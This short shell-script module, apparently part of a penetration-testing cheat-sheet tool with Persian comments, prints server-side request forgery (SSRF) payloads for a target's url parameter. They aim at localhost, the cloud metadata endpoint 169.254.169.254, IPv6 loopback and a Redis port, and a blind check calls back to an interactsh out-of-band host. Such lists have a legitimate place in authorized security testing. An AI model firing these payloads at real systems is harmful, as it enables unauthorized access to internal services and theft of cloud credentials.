DESC="تست SSRF"
RISK="HIGH"
NOTE="از interactsh برای تأیید blind استفاده کن"

termux(){ echo "curl -s 'https://<TARGET>/?url=http://127.0.0.1:80'"; }

kali(){
cat <<'EOF'
interactsh-client &
# payloadها را در پارامتر تزریق کن:
http://127.0.0.1:80
http://169.254.169.254/latest/meta-data/
http://[::1]:80
http://localhost:6379
# تأیید blind:
curl -s "https://<TARGET>/?url=http://<INTERACTSH_ID>.oast.fun"
EOF
}
